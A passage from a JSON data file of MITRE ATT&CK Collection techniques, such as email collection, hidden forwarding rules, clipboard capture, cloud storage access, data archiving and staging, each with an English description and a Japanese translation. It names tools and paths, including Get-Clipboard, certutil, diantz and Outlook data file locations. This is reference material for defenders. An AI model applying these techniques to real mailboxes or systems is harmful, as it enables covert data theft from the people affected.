            },
            {
                "id": "T1114",
                "name_eng": "Email Collection",
                "name_jp": "メール収集",
                "description_eng": "Adversaries may target user email to collect sensitive information. Emails may contain sensitive data, including trade secrets or personal information, that can prove valuable to adversaries. Emails may also contain details of ongoing incident response operations, which may allow adversaries to adjust their techniques in order to maintain persistence or evade defenses.(Citation: TrustedSec OOB Communications)(Citation: CISA AA20-352A 2021) Adversaries can collect or forward email from mail servers or clients.",
                "description_jp": "攻撃者は、機密情報を収集するためにユーザーの電子メールを標的にする可能性があります。電子メールには、企業秘密や個人情報など、攻撃者にとって価値のある機密データが含まれている可能性があります。電子メールには、進行中のインシデント対応操作の詳細が含まれている場合もあり、これにより攻撃者は永続性を維持したり防御を回避したりするためにテクニックを調整できる可能性があります。(引用: TrustedSec OOB Communications)(引用: CISA AA20-352A 2021) 攻撃者は、メールサーバーまたはクライアントから電子メールを収集または転送できます。",
                "subtechniques": [
                    {
                        "id": "T1114.002",
                        "name_eng": "Remote Email Collection",
                        "name_jp": "リモートメール収集",
                        "description_eng": "Adversaries may target an Exchange server, Office 365, or Google Workspace to collect sensitive information. Adversaries may leverage a user's credentials and interact directly with the Exchange server to acquire information from within a network. Adversaries may also access externally facing Exchange services, Office 365, or Google Workspace to access email using credentials or access tokens. Tools such as [MailSniper](https://attack.mitre.org/software/S0413) can be used to automate searches for specific keywords.",
                        "description_jp": "攻撃者は、機密情報を収集するためにExchangeサーバー、Office 365、またはGoogle Workspaceを標的にする可能性があります。攻撃者は、ユーザーの資格情報を利用し、Exchangeサーバーと直接対話してネットワーク内から情報を取得する可能性があります。攻撃者はまた、資格情報またはアクセストークンを使用してメールにアクセスするために、外部に公開されているExchangeサービス、Office 365、またはGoogle Workspaceにアクセスする可能性もあります。[MailSniper](https://attack.mitre.org/software/S0413)などのツールを使用して、特定のキーワードの検索を自動化できます。"
                    },
                    {
                        "id": "T1114.003",
                        "name_eng": "Email Forwarding Rule",
                        "name_jp": "メール転送ルール",
                        "description_eng": "Adversaries may setup email forwarding rules to collect sensitive information. Adversaries may abuse email forwarding rules to monitor the activities of a victim, steal information, and further gain intelligence on the victim or the victim’s organization to use as part of further exploits or operations.(Citation: US-CERT TA18-068A 2018) Furthermore, email forwarding rules can allow adversaries to maintain persistent access to victim's emails even after compromised credentials are reset by administrators.(Citation: Pfammatter - Hidden Inbox Rules) Most email clients allow users to create inbox rules for various email functions, including forwarding to a different recipient. These rules may be created through a local email application, a web interface, or by command-line interface. Messages can be forwarded to internal or external recipients, and there are no restrictions limiting the extent of this rule. Administrators may also create forwarding rules for user accounts with the same considerations and outcomes.(Citation: Microsoft Tim McMichael Exchange Mail Forwarding 2)(Citation: Mac Forwarding Rules)\n\nAny user or administrator within the organization (or adversary with valid credentials) can create rules to automatically forward all received messages to another recipient, forward emails to different locations based on the sender, and more. Adversaries may also hide the rule by making use of the Microsoft Messaging API (MAPI) to modify the rule properties, making it hidden and not visible from Outlook, OWA or most Exchange Administration tools.(Citation: Pfammatter - Hidden Inbox Rules)\n\nIn some environments, administrators may be able to enable email forwarding rules that operate organization-wide rather than on individual inboxes. For example, Microsoft Exchange supports transport rules that evaluate all mail an organization receives against user-specified conditions, then performs a user-specified action on mail that adheres to those conditions.(Citation: Microsoft Mail Flow Rules 2023) Adversaries that abuse such features may be able to enable forwarding on all or specific mail an organization receives.",
                        "description_jp": "攻撃者は、機密情報を収集するためにメール転送ルールを設定する可能性があります。攻撃者はメール転送ルールを悪用して、被害者の活動を監視したり、情報を盗んだり、さらなる悪用や作戦の一環として使用するために被害者または被害者の組織に関する情報をさらに収集したりする可能性があります。(引用: US-CERT TA18-068A 2018) さらに、メール転送ルールにより、攻撃者は管理者が侵害された資格情報をリセットした後でも、被害者のメールへの永続的なアクセスを維持できます。(引用: Pfammatter - Hidden Inbox Rules) ほとんどのメールクライアントでは、ユーザーは別の受信者への転送など、さまざまなメール機能の受信トレイ ルールを作成できます。これらのルールは、ローカルのメールアプリケーション、Webインターフェイス、またはコマンドラインインターフェイスを介して作成できます。メッセージは内部または外部の受信者に転送でき、このルールの範囲を制限するものはありません。管理者はまた、同じ考慮事項と結果でユーザーアカウントの転送ルールを作成することもできます。(引用: Microsoft Tim McMichael Exchange Mail Forwarding 2)(引用: Mac Forwarding Rules)\n\n組織内の任意のユーザーまたは管理者（または有効な資格情報を持つ攻撃者）は、受信したすべてのメッセージを別の受信者に自動的に転送したり、送信者に基づいてメールを別の場所に転送したりするルールを作成できます。攻撃者はまた、Microsoft Messaging API（MAPI）を使用してルールプロパティを変更し、Outlook、OWA、またはほとんどのExchange管理ツールから非表示にして見えなくすることで、ルールを隠すこともあります。(引用: Pfammatter - Hidden Inbox Rules)\n\n一部の環境では、管理者は個々の受信トレイではなく組織全体で動作するメール転送ルールを有効にできる場合があります。例えば、Microsoft Exchangeは、組織が受信するすべてのメールをユーザー指定の条件に対して評価し、それらの条件に準拠するメールに対してユーザー指定のアクションを実行するトランスポートルールをサポートしています。(引用: Microsoft Mail Flow Rules 2023) このような機能を悪用する攻撃者は、組織が受信するすべてまたは特定のメールの転送を有効にできる可能性があります。"
                    },
                    {
                        "id": "T1114.001",
                        "name_eng": "Local Email Collection",
                        "name_jp": "ローカルメール収集",
                        "description_eng": "Adversaries may target user email on local systems to collect sensitive information. Files containing email data can be acquired from a user’s local system, such as Outlook storage or cache files.\n\nOutlook stores data locally in offline data files with an extension of .ost. Outlook 2010 and later supports .ost file sizes up to 50GB, while earlier versions of Outlook support up to 20GB.(Citation: Outlook File Sizes) IMAP accounts in Outlook 2013 (and earlier) and POP accounts use Outlook Data Files (.pst) as opposed to .ost, whereas IMAP accounts in Outlook 2016 (and later) use .ost files. Both types of Outlook data files are typically stored in `C:\\Users\\<username>\\Documents\\Outlook Files` or `C:\\Users\\<username>\\AppData\\Local\\Microsoft\\Outlook`.(Citation: Microsoft Outlook Files)",
                        "description_jp": "攻撃者は、機密情報を収集するためにローカルシステム上のユーザーの電子メールを標的にする可能性があります。電子メールデータを含むファイルは、Outlookストレージファイルやキャッシュファイルなど、ユーザーのローカルシステムから取得できます。\n\nOutlookは、.ostという拡張子のオフラインデータファイルにデータをローカルに保存します。Outlook 2010以降は最大50GBの.ostファイルサイズをサポートし、それ以前のバージョンのOutlookは最大20GBをサポートします。(引用: Outlook File Sizes) Outlook 2013（およびそれ以前）のIMAPアカウントとPOPアカウントは、.ostではなくOutlookデータファイル（.pst）を使用しますが、Outlook 2016（およびそれ以降）のIMAPアカウントは.ostファイルを使用します。どちらの種類のOutlookデータファイルも、通常、<code>C:\\Users\\<username>\\Documents\\Outlook Files</code>または<code>C:\\Users\\<username>\\AppData\\Local\\Microsoft\\Outlook</code>に保存されます。(引用: Microsoft Outlook Files)"
                    }
                ]
            },
            {
                "id": "T1025",
                "name_eng": "Data from Removable Media",
                "name_jp": "リムーバブルメディアからのデータ",
                "description_eng": "Adversaries may search connected removable media on computers they have compromised to find files of interest. Sensitive data can be collected from any removable media (optical disk drive, USB memory, etc.) connected to the compromised system prior to Exfiltration. Interactive command shells may be in use, and common functionality within [cmd](https://attack.mitre.org/software/S0106) may be used to gather information. \n\nSome adversaries may also use [Automated Collection](https://attack.mitre.org/techniques/T1119) on removable media.",
                "description_jp": "攻撃者は、侵害したコンピュータに接続されているリムーバブルメディアを検索して、関心のあるファイルを見つける可能性があります。機密データは、持ち出し前に侵害されたシステムに接続されているリムーバブルメディア（光ディスクドライブ、USBメモリなど）から収集できます。対話型コマンドシェルが使用されている可能性があり、[cmd](https://attack.mitre.org/software/S0106)内の一般的な機能を使用して情報を収集できます。\n\n一部の攻撃者は、リムーバブルメディアで[自動収集](https://attack.mitre.org/techniques/T1119)を使用することもあります。",
                "subtechniques": []
            },
            {
                "id": "T1119",
                "name_eng": "Automated Collection",
                "name_jp": "自動収集",
                "description_eng": "Once established within a system or network, an adversary may use automated techniques for collecting internal data. Methods for performing this technique could include use of a [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059) to search for and copy information fitting set criteria such as file type, location, or name at specific time intervals. \n\nIn cloud-based environments, adversaries may also use cloud APIs, data pipelines, command line interfaces, or extract, transform, and load (ETL) services to automatically collect data.(Citation: Mandiant UNC3944 SMS Phishing 2023) \n\nThis functionality could also be built into remote access tools. \n\nThis technique may incorporate use of other techniques such as [File and Directory Discovery](https://attack.mitre.org/techniques/T1083) and [Lateral Tool Transfer](https://attack.mitre.org/techniques/T1570) to identify and move files, as well as [Cloud Service Dashboard](https://attack.mitre.org/techniques/T1538) and [Cloud Storage Object Discovery](https://attack.mitre.org/techniques/T1619) to identify resources in cloud environments.",
                "description_jp": "システムまたはネットワーク内に確立されると、攻撃者は内部データを収集するために自動化されたテクニックを使用する可能性があります。このテクニックを実行する方法には、[コマンドおよびスクリプトインタープリタ](https://attack.mitre.org/techniques/T1059)を使用して、特定の時間間隔でファイルタイプ、場所、または名前などの設定基準に適合する情報を検索およびコピーすることが含まれる場合があります。\n\nクラウドベースの環境では、攻撃者はクラウドAPI、データパイプライン、コマンドラインインターフェイス、または抽出、変換、ロード（ETL）サービスを使用してデータを自動的に収集することもできます。(引用: Mandiant UNC3944 SMS Phishing 2023)\n\nこの機能はリモートアクセスツールに組み込むこともできます。\n\nこのテクニックには、[ファイルとディレクトリの発見](https://attack.mitre.org/techniques/T1083)や[ラテラルツール転送](https://attack.mitre.org/techniques/T1570)などの他のテクニックを使用してファイルを特定および移動したり、[クラウドサービスダッシュボード](https://attack.mitre.org/techniques/T1538)や[クラウドストレージオブジェクトの発見](https://attack.mitre.org/techniques/T1619)を使用してクラウド環境のリソースを特定したりすることが含まれる場合があります。",
                "subtechniques": []
            },
            {
                "id": "T1115",
                "name_eng": "Clipboard Data",
                "name_jp": "クリップボードデータ",
                "description_eng": "Adversaries may collect data stored in the clipboard from users copying information within or between applications. \n\nFor example, on Windows adversaries can access clipboard data by using <code>clip.exe</code> or <code>Get-Clipboard</code>.(Citation: MSDN Clipboard)(Citation: clip_win_server)(Citation: CISA_AA21_200B) Additionally, adversaries may monitor then replace users’ clipboard with their data (e.g., [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002)).(Citation: mining_ruby_reversinglabs)\n\nmacOS and Linux also have commands, such as <code>pbpaste</code>, to grab clipboard contents.(Citation: Operating with EmPyre)",
                "description_jp": "攻撃者は、ユーザーがアプリケーション内またはアプリケーション間で情報をコピーすることによってクリップボードに保存されたデータを収集する可能性があります。\n\n例えば、Windowsでは、攻撃者は<code>clip.exe</code>または<code>Get-Clipboard</code>を使用してクリップボードデータにアクセスできます。(引用: MSDN Clipboard)(引用: clip_win_server)(引用: CISA_AA21_200B) さらに、攻撃者はユーザーのクリップボードを監視し、その後自分のデータに置き換える可能性があります（例：[送信データ操作](https://attack.mitre.org/techniques/T1565/002)）。(引用: mining_ruby_reversinglabs)\n\nmacOSとLinuxにも、<code>pbpaste</code>など、クリップボードの内容を取得するコマンドがあります。(引用: Operating with EmPyre)",
                "subtechniques": []
            },
            {
                "id": "T1530",
                "name_eng": "Data from Cloud Storage",
                "name_jp": "クラウドストレージからのデータ",
                "description_eng": "Adversaries may access data from cloud storage.\n\nMany IaaS providers offer solutions for online data object storage such as Amazon S3, Azure Storage, and Google Cloud Storage. Similarly, SaaS enterprise platforms such as Office 365 and Google Workspace provide cloud-based document storage to users through services such as OneDrive and Google Drive, while SaaS application providers such as Slack, Confluence, Salesforce, and Dropbox may provide cloud storage solutions as a peripheral or primary use case of their platform. \n\nIn some cases, as with IaaS-based cloud storage, there exists no overarching application (such as SQL or Elasticsearch) with which to interact with the stored objects: instead, data from these solutions is retrieved directly though the [Cloud API](https://attack.mitre.org/techniques/T1059/009). In SaaS applications, adversaries may be able to collect this data directly from APIs or backend cloud storage objects, rather than through their front-end application or interface (i.e., [Data from Information Repositories](https://attack.mitre.org/techniques/T1213)). \n\nAdversaries may collect sensitive data from these cloud storage solutions. Providers typically offer security guides to help end users configure systems, though misconfigurations are a common problem.(Citation: Amazon S3 Security, 2019)(Citation: Microsoft Azure Storage Security, 2019)(Citation: Google Cloud Storage Best Practices, 2019) There have been numerous incidents where cloud storage has been improperly secured, typically by unintentionally allowing public access to unauthenticated users, overly-broad access by all users, or even access for any anonymous person outside the control of the Identity Access Management system without even needing basic user permissions.\n\nThis open access may expose various types of sensitive data, such as credit cards, personally identifiable information, or medical records.(Citation: Trend Micro S3 Exposed PII, 2017)(Citation: Wired Magecart S3 Buckets, 2019)(Citation: HIPAA Journal S3 Breach, 2017)(Citation: Rclone-mega-extortion_05_2021)\n\nAdversaries may also obtain then abuse leaked credentials from source repositories, logs, or other means as a way to gain access to cloud storage objects.",
                "description_jp": "攻撃者はクラウドストレージからデータにアクセスする可能性があります。\n\n多くのIaaSプロバイダーは、Amazon S3、Azure Storage、Google Cloud Storageなどのオンラインデータオブジェクトストレージソリューションを提供しています。同様に、Office 365やGoogle WorkspaceなどのSaaSエンタープライズプラットフォームは、OneDriveやGoogle Driveなどのサービスを介してユーザーにクラウドベースのドキュメントストレージを提供し、Slack、Confluence、Salesforce、DropboxなどのSaaSアプリケーションプロバイダーは、プラットフォームの周辺または主要なユースケースとしてクラウドストレージソリューションを提供する場合があります。\n\nIaaSベースのクラウドストレージの場合など、保存されたオブジェクトと対話するための包括的なアプリケーション（SQLやElasticsearchなど）が存在しない場合があります。代わりに、これらのソリューションからのデータは[クラウドAPI](https://attack.mitre.org/techniques/T1059/009)を介して直接取得されます。SaaSアプリケーションでは、攻撃者はフロントエンドアプリケーションやインターフェイス（つまり、[情報リポジトリからのデータ](https://attack.mitre.org/techniques/T1213)）を介さずに、APIやバックエンドクラウドストレージオブジェクトから直接このデータを収集できる場合があります。\n\n攻撃者はこれらのクラウドストレージソリューションから機密データを収集する可能性があります。プロバイダーは通常、エンドユーザーがシステムを設定するのに役立つセキュリティガイドを提供していますが、設定ミスは一般的な問題です。(引用: Amazon S3 Security, 2019)(引用: Microsoft Azure Storage Security, 2019)(引用: Google Cloud Storage Best Practices, 2019) クラウドストレージが不適切に保護されているインシデントが多数発生しており、通常は意図せずに認証されていないユーザーへのパブリックアクセス、すべてのユーザーによる過度に広範なアクセス、または基本的なユーザー権限さえ必要とせずにIDアクセス管理システムの制御外の匿名ユーザーによるアクセスを許可することによって発生します。\n\nこのオープンアクセスにより、クレジットカード、個人を特定できる情報、医療記録など、さまざまな種類の機密データが公開される可能性があります。(引用: Trend Micro S3 Exposed PII, 2017)(引用: Wired Magecart S3 Buckets, 2019)(引用: HIPAA Journal S3 Breach, 2017)(引用: Rclone-mega-extortion_05_2021)\n\n攻撃者はまた、クラウストレージオブジェクトへのアクセスを取得する手段として、ソースリポジトリ、ログ、またはその他の手段から漏洩した資格情報を取得して悪用する可能性があります。",
                "subtechniques": []
            },
            {
                "id": "T1005",
                "name_eng": "Data from Local System",
                "name_jp": "ローカルシステムからのデータ",
                "description_eng": "Adversaries may search local system sources, such as file systems, configuration files, local databases, or virtual machine files, to find files of interest and sensitive data prior to Exfiltration.\n\nAdversaries may do this using a [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059), such as [cmd](https://attack.mitre.org/software/S0106) as well as a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008), which have functionality to interact with the file system to gather information.(Citation: show_run_config_cmd_cisco) Adversaries may also use [Automated Collection](https://attack.mitre.org/techniques/T1119) on the local system.",
                "description_jp": "攻撃者は、持ち出し前に、ファイルシステム、構成ファイル、ローカルデータベース、仮想マシンファイルなどのローカルシステムソースを検索して、関心のあるファイルや機密データを見つける可能性があります。\n\n攻撃者は、[cmd](https://attack.mitre.org/software/S0106)や[ネットワークデバイスCLI](https://attack.mitre.org/techniques/T1059/008)などの[コマンドおよびスクリプトインタープリタ](https://attack.mitre.org/techniques/T1059)を使用してこれを行う可能性があり、これらは情報を収集するためにファイルシステムと対話する機能を備えています。(引用: show_run_config_cmd_cisco) 攻撃者はまた、ローカルシステムで[自動収集](https://attack.mitre.org/techniques/T1119)を使用する可能性もあります。",
                "subtechniques": []
            },
            {
                "id": "T1560",
                "name_eng": "Archive Collected Data",
                "name_jp": "収集データのアーカイブ",
                "description_eng": "An adversary may compress and/or encrypt data that is collected prior to exfiltration. Compressing the data can help to obfuscate the collected data and minimize the amount of data sent over the network.(Citation: DOJ GRU Indictment Jul 2018) Encryption can be used to hide information that is being exfiltrated from detection or make exfiltration less conspicuous upon inspection by a defender.\n\nBoth compression and encryption are done prior to exfiltration, and can be performed using a utility, 3rd party library, or custom method.",
                "description_jp": "敵対者は、持ち出し前に収集したデータを圧縮および/または暗号化することがある。データを圧縮することで、収集したデータを難読化し、ネットワーク経由で送信されるデータ量を最小限に抑えることができる(引用：DOJ GRU Indictment Jul 2018)。暗号化は、持ち出される情報を検出から隠したり、防御側による検査の際に持ち出しを目立たなくしたりするために使用することができる。\n\n圧縮と暗号化はどちらも持ち出し前に行われ、ユーティリティ、サードパーティライブラリ、またはカスタムメソッドを使用して実行できます。",
                "subtechniques": [
                    {
                        "id": "T1560.002",
                        "name_eng": "Archive via Library",
                        "name_jp": "ライブラリ経由のアーカイブ",
                        "description_eng": "An adversary may compress or encrypt data that is collected prior to exfiltration using 3rd party libraries. Many libraries exist that can archive data, including [Python](https://attack.mitre.org/techniques/T1059/006) rarfile (Citation: PyPI RAR), libzip (Citation: libzip), and zlib (Citation: Zlib Github). Most libraries include functionality to encrypt and/or compress data.\n\nSome archival libraries are preinstalled on systems, such as bzip2 on macOS and Linux, and zip on Windows. Note that the libraries are different from the utilities. The libraries can be linked against when compiling, while the utilities require spawning a subshell, or a similar execution mechanism.",
                        "description_jp": "敵対者は、持ち出し前に収集したデータをサードパーティライブラリを使用して圧縮または暗号化することがある。データをアーカイブできるライブラリは多数存在し、[Python](https://attack.mitre.org/techniques/T1059/006) rarfile (引用: PyPI RAR)、libzip (引用: libzip)、zlib (引用: Zlib Github) などがある。ほとんどのライブラリには、データを暗号化および/または圧縮する機能が含まれている。\n\nmacOSやLinuxのbzip2やWindowsのzipなど、一部のアーカイブライブラリはシステムにプリインストールされています。ライブラリはユーティリティとは異なることに注意してください。ライブラリはコンパイル時にリンクできますが、ユーティリティはサブシェルの起動や同様の実行メカニズムが必要です。"
                    },
                    {
                        "id": "T1560.001",
                        "name_eng": "Archive via Utility",
                        "name_jp": "ユーティリティ経由のアーカイブ",
                        "description_eng": "Adversaries may use utilities to compress and/or encrypt collected data prior to exfiltration. Many utilities include functionalities to compress, encrypt, or otherwise package data into a format that is easier/more secure to transport.\n\nAdversaries may abuse various utilities to compress or encrypt data before exfiltration. Some third party utilities may be preinstalled, such as <code>tar</code> on Linux and macOS or <code>zip</code> on Windows systems. \n\nOn Windows, <code>diantz</code> or <code> makecab</code> may be used to package collected files into a cabinet (.cab) file. <code>diantz</code> may also be used to download and compress files from remote locations (i.e. [Remote Data Staging](https://attack.mitre.org/techniques/T1074/002)).(Citation: diantz.exe_lolbas) <code>xcopy</code> on Windows can copy files and directories with a variety of options. Additionally, adversaries may use [certutil](https://attack.mitre.org/software/S0160) to Base64 encode collected data before exfiltration. \n\nAdversaries may use also third party utilities, such as 7-Zip, WinRAR, and WinZip, to perform similar activities.(Citation: 7zip Homepage)(Citation: WinRAR Homepage)(Citation: WinZip Homepage)",
                        "description_jp": "攻撃者は、持ち出し前に収集したデータを圧縮および/または暗号化するためにユーティリティを使用する可能性があります。多くのユーティリティには、データを圧縮、暗号化、またはその他の方法でパッケージ化して、輸送が容易/安全になる形式にする機能が含まれています。\n\n敵対者は、持ち出し前にデータを圧縮または暗号化するためにさまざまなユーティリティを悪用する可能性があります。一部のサードパーティユーティリティは、LinuxおよびmacOSの<code>tar</code>やWindowsシステムの<code>zip</code>など、プリインストールされている場合があります。\n\nWindowsでは、<code>diantz</code>または<code>makecab</code>を使用して、収集したファイルをキャビネット（.cab）ファイルにパッケージ化できます。<code>diantz</code>は、リモートの場所からファイルをダウンロードして圧縮するためにも使用できます（つまり、[リモートデータステージング](https://attack.mitre.org/techniques/T1074/002)）。(引用: diantz.exe_lolbas) Windowsの<code>xcopy</code>は、さまざまなオプションでファイルとディレクトリをコピーできます。さらに、攻撃者は[certutil](https://attack.mitre.org/software/S0160)を使用して、持ち出し前に収集したデータをBase64エンコードする可能性があります。\n\n攻撃者は、7-Zip、WinRAR、WinZipなどのサードパーティユーティリティを使用して、同様のアクティビティを実行することもあります。(引用: 7zip Homepage)(引用: WinRAR Homepage)(引用: WinZip Homepage)"
                    },
                    {
                        "id": "T1560.003",
                        "name_eng": "Archive via Custom Method",
                        "name_jp": "カスタムメソッド経由のアーカイブ",
                        "description_eng": "An adversary may compress or encrypt data that is collected prior to exfiltration using a custom method. Adversaries may choose to use custom archival methods, such as encryption with XOR or stream ciphers implemented with no external library or utility references. Custom implementations of well-known compression algorithms have also been used.(Citation: ESET Sednit Part 2)",
                        "description_jp": "敵対者は、持ち出し前に収集したデータをカスタムメソッドを使用して圧縮または暗号化することがある。敵対者は、XORによる暗号化や、外部ライブラリやユーティリティ参照なしで実装されたストリーム暗号など、カスタムのアーカイブメソッドを使用することを選択するかもしれない。よく知られた圧縮アルゴリズムのカスタム実装も使用されている(引用：ESET Sednit Part 2)。"
                    }
                ]
            },
            {
                "id": "T1185",
                "name_eng": "Browser Session Hijacking",
                "name_jp": "ブラウザセッションハイジャック",
                "description_eng": "Adversaries may take advantage of security vulnerabilities and inherent functionality in browser software to change content, modify user-behaviors, and intercept information as part of various browser session hijacking techniques.(Citation: Wikipedia Man in the Browser)\n\nA specific example is when an adversary injects software into a browser that allows them to inherit cookies, HTTP sessions, and SSL client certificates of a user then use the browser as a way to pivot into an authenticated intranet.(Citation: Cobalt Strike Browser Pivot)(Citation: ICEBRG Chrome Extensions) Executing browser-based behaviors such as pivoting may require specific process permissions, such as <code>SeDebugPrivilege</code> and/or high-integrity/administrator rights.\n\nAnother example involves pivoting browser traffic from the adversary's browser through the user's browser by setting up a proxy which will redirect web traffic. This does not alter the user's traffic in any way, and the proxy connection can be severed as soon as the browser is closed. The adversary assumes the security context of whichever browser process the proxy is injected into. Browsers typically create a new process for each tab that is opened and permissions and certificates are separated accordingly. With these permissions, an adversary could potentially browse to any resource on an intranet, such as [Sharepoint](https://attack.mitre.org/techniques/T1213/002) or webmail, that is accessible through the browser and which the browser has sufficient permissions. Browser pivoting may also bypass security provided by 2-factor authentication.(Citation: cobaltstrike manual)",
                "description_jp": "攻撃者は、ブラウザソフトウェアのセキュリティ脆弱性や固有の機能を利用して、コンテンツを変更したり、ユーザーの行動を改変したり、さまざまなブラウザセッションハイジャックテクニックの一環として情報を傍受したりする可能性があります。(引用: Wikipedia Man in the Browser)\n\n具体的な例としては、攻撃者がブラウザにソフトウェアを注入し、ユーザーのクッキー、HTTPセッション、SSLクライアント証明書を継承し、その後ブラウザを認証済みイントラネットへのピボット手段として使用する場合が挙げられます。(引用: Cobalt Strike Browser Pivot)(引用: ICEBRG Chrome Extensions) ピボットなどのブラウザベースの動作を実行するには、<code>SeDebugPrivilege</code>や高整合性/管理者権限など、特定のプロセス権限が必要になる場合があります。\n\n別の例としては、Webトラフィックをリダイレクトするプロキシを設定することにより、攻撃者のブラウザからユーザーのブラウザ経由でブラウザトラフィックをピボットすることが含まれます。これはユーザーのトラフィックを一切変更せず、ブラウザが閉じられるとすぐにプロキシ接続を切断できます。攻撃者は、プロキシが注入されたブラウザプロセスのセキュリティコンテキストを引き継ぎます。ブラウザは通常、開いているタブごとに新しいプロセスを作成し、権限と証明書はそれに応じて分離されます。これらの権限があれば、攻撃者は[Sharepoint](https://attack.mitre.org/techniques/T1213/002)やウェブメールなど、ブラウザ経由でアクセス可能であり、ブラウザが十分な権限を持つイントラネット上の任意のリソースを閲覧できる可能性があります。ブラウザピボットは、2要素認証によって提供されるセキュリティをバイパスする可能性もあります。(引用: cobaltstrike manual)",
                "subtechniques": []
            },
            {
                "id": "T1125",
                "name_eng": "Video Capture",
                "name_jp": "ビデオキャプチャ",
                "description_eng": "An adversary can leverage a computer's peripheral devices (e.g., integrated cameras or webcams) or applications (e.g., video call services) to capture video recordings for the purpose of gathering information. Images may also be captured from devices or applications, potentially in specified intervals, in lieu of video files.\n\nMalware or scripts may be used to interact with the devices through an available API provided by the operating system or an application to capture video or images. Video or image files may be written to disk and exfiltrated later. This technique differs from [Screen Capture](https://attack.mitre.org/techniques/T1113) due to use of specific devices or applications for video recording rather than capturing the victim's screen.\n\nIn macOS, there are a few different malware samples that record the user's webcam such as FruitFly and Proton. (Citation: objective-see 2017 review)",
                "description_jp": "敵対者は、コンピュータの周辺機器（内蔵カメラやウェブカメラなど）やアプリケーション（ビデオ通話サービスなど）を利用して、情報収集のためにビデオ録画をキャプチャすることができます。ビデオファイルの代わりに、指定された間隔でデバイスやアプリケーションから画像がキャプチャされることもあります。\n\nマルウェアやスクリプトは、オペレーティングシステムやアプリケーションが提供する利用可能なAPIを介してデバイスと対話し、ビデオや画像をキャプチャするために使用される場合があります。ビデオファイルや画像ファイルはディスクに書き込まれ、後で持ち出される可能性があります。このテクニックは、被害者の画面をキャプチャするのではなく、ビデオ録画のために特定のデバイスやアプリケーションを使用する点で[スクリーンキャプチャ](https://attack.mitre.org/techniques/T1113)とは異なります。\n\nmacOSでは、FruitFlyやProtonなど、ユーザーのウェブカメラを録画するマルウェアのサンプルがいくつかあります。(引用: objective-see 2017 review)",
                "subtechniques": []
            },
            {
                "id": "T1074",
                "name_eng": "Data Staged",
                "name_jp": "ステージングされたデータ",
                "description_eng": "Adversaries may stage collected data in a central location or directory prior to Exfiltration. Data may be kept in separate files or combined into one file through techniques such as [Archive Collected Data](https://attack.mitre.org/techniques/T1560). Interactive command shells may be used, and common functionality within [cmd](https://attack.mitre.org/software/S0106) and bash may be used to copy data into a staging location.(Citation: PWC Cloud Hopper April 2017)\n\nIn cloud environments, adversaries may stage data within a particular instance or virtual machine before exfiltration. An adversary may [Create Cloud Instance](https://attack.mitre.org/techniques/T1578/002) and stage data in that instance.(Citation: Mandiant M-Trends 2020)\n\nAdversaries may choose to stage data from a victim network in a centralized location prior to Exfiltration to minimize the number of connections made to their C2 server and better evade detection.",
                "description_jp": "攻撃者は、持ち出し前に、収集したデータを中央の場所またはディレクトリにステージングする可能性があります。データは、[収集データのアーカイブ](https://attack.mitre.org/techniques/T1560)などのテクニックを介して、個別のファイルに保持されたり、1つのファイルに結合されたりする場合があります。対話型コマンドシェルが使用される場合があり、[cmd](https://attack.mitre.org/software/S0106)およびbash内の一般的な機能を使用して、データをステージング場所にコピーできます。(引用: PWC Cloud Hopper April 2017)\n\nクラウド環境では、攻撃者は持ち出し前に特定のインスタンスまたは仮想マシン内にデータをステージングする可能性があります。攻撃者は[クラウドインスタンスの作成](https://attack.mitre.org/techniques/T1578/002)を行い、そのインスタンスにデータをステージングする可能性があります。(引用: Mandiant M-Trends 2020)\n\n敵対者は、C2サーバーへの接続数を最小限に抑え、検出をよりよく回避するために、持ち出し前に被害者ネットワークから中央の場所にデータをステージングすることを選択する可能性があります。",
                "subtechniques": [
                    {
                        "id": "T1074.001",
                        "name_eng": "Local Data Staging",
                        "name_jp": "ローカルデータステージング",
                        "description_eng": "Adversaries may stage collected data in a central location or directory on the local system prior to Exfiltration. Data may be kept in separate files or combined into one file through techniques such as [Archive Collected Data](https://attack.mitre.org/techniques/T1560). Interactive command shells may be used, and common functionality within [cmd](https://attack.mitre.org/software/S0106) and bash may be used to copy data into a staging location.\n\nAdversaries may also stage collected data in various available formats/locations of a system, including local storage databases/repositories or the Windows Registry.(Citation: Prevailion DarkWatchman 2021)",
                        "description_jp": "攻撃者は、持ち出し前に、収集したデータをローカルシステム上の中央の場所またはディレクトリにステージングする可能性があります。データは、[収集データのアーカイブ](https://attack.mitre.org/techniques/T1560)などのテクニックを介して、個別のファイルに保持されたり、1つのファイルに結合されたりする場合があります。対話型コマンドシェルが使用される場合があり、[cmd](https://attack.mitre.org/software/S0106)およびbash内の一般的な機能を使用して、データをステージング場所にコピーできます。\n\n攻撃者はまた、ローカルストレージデータベース/リポジトリやWindowsレジストリなど、システムのさまざまな利用可能な形式/場所に収集したデータをステージングする可能性もあります。(引用: Prevailion DarkWatchman 2021)"
                    },
                    {
                        "id": "T1074.002",
                        "name_eng": "Remote Data Staging",
                        "name_jp": "リモートデータステージング",
                        "description_eng": "Adversaries may stage data collected from multiple systems in a central location or directory on one system prior to Exfiltration. Data may be kept in separate files or combined into one file through techniques such as [Archive Collected Data](https://attack.mitre.org/techniques/T1560). Interactive command shells may be used, and common functionality within [cmd](https://attack.mitre.org/software/S0106) and bash may be used to copy data into a staging location.\n\nIn cloud environments, adversaries may stage data within a particular instance or virtual machine before exfiltration. An adversary may [Create Cloud Instance](https://attack.mitre.org/techniques/T1578/002) and stage data in that instance.(Citation: Mandiant M-Trends 2020)\n\nBy staging data on one system prior to Exfiltration, adversaries can minimize the number of connections made to their C2 server and better evade detection.",
